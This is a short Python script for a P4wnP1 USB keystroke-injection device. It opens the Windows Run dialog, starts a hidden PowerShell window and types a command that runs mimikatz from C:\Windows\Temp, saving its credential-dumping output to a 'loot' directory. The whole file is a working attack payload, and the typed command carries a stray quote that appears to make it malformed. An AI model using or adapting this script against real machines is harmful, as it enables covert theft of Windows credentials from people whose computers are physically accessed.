#!/usr/bin/env python3
import os, sys, time, pathlib
P4WN_HOME=os.environ.get("P4WN_HOME","/opt/p4wnp1")
sys.path.insert(0,str(pathlib.Path(P4WN_HOME)/"tools"))
from hid_type import win_r, type_string

MIMI = os.getenv("MIMIKATZ_PATH", r"C:\Windows\Temp\mimikatz.exe")
CMDS = os.getenv("MIMI_SCRIPT",   r"C:\Windows\Temp\mimi.txt")
OUT  = os.getenv("LOOT_DIR",      r"C:\Windows\Temp")

def main():
    win_r(); time.sleep(0.4)
    type_string("powershell -nop -w hidden\n"); time.sleep(0.3)
    type_string(fr"& '{MIMI}' '" + fr"' < '{CMDS}' > '{OUT}\mimikatz.txt' 2>&1\n")
    print("[*] Triggered mimikatz wrapper, output ->", OUT + r"\mimikatz.txt")
if __name__ == "__main__": main()
